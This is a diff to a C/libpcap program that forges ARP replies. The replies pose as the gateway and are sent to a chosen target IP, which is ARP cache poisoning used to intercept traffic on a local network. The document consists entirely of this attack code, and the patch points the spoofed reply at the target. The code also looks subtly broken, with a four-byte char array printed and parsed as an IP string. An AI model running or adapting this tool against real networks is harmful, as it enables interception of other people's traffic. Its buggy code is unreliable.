@@ -60,8 +60,9 @@ void Make_Header(void * data);
 void GetMacAddress(char *dev);
 char * GetIpAddress(char *dev);
 char *gateway;
+char *targetip;
 uint8_t mac_addr[6];
-uint8_t ip_addr[4];
+char ip_addr[4];
 int main(int argc, char* argv[])
 {
    struct pcap_pkthdr* header;
@@ -70,9 +71,11 @@ int main(int argc, char* argv[])
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    GetMacAddress(dev);
-   char * ip_addr = GetIpAddress(dev);
+   GetIpAddress(dev);
+   targetip = argv[2];
    gateway = argv[3];
- 
+   printf("ip address : %s\n",ip_addr);
+   printf("target ip : %s\n",targetip); 
 
    memcpy(Rframe,"\xFF\xFF\xFF\xFF\xFF\xFF",6); //input DEST mac
    memcpy(Rframe+6,mac_addr,6); //input SRC mac
@@ -84,7 +87,7 @@ int main(int argc, char* argv[])
    arpR->ar_pln = PRT_SZ;
    arpR->ar_op = htons(ARPOP_REQUEST);
    inet_pton(AF_INET,ip_addr,&arpR->arp_spa);
-   inet_pton(AF_INET,argv[2],&arpR->arp_tpa);   
+   inet_pton(AF_INET,targetip,&arpR->arp_tpa);   
    
    printf("[DEBUG] ");
    for (int i=0; i<42; i++)
@@ -130,13 +133,13 @@ void Make_Header(void * data)
   memcpy(arpF->arp_sha,(void *)mac_addr,6);
 
   inet_pton(AF_INET,gateway,&arpF->arp_spa);
-  inet_pton(AF_INET,inet_ntoa(*(in_addr*)&arpS->arp_spa),&arpF->arp_tpa);
+  inet_pton(AF_INET,targetip,&arpF->arp_tpa);
   
   printf("[DEBUG] ");
   for (int i=0; i<42; i++)
         printf("%02x ",frame[i]);
   printf("\n");
-  if(pcap_sendpacket(handle,frame, 42)!=0)
+  if(pcap_sendpacket(handle,frame, sizeof(frame))!=0)
   {
     printf("False\n");
     exit(0);
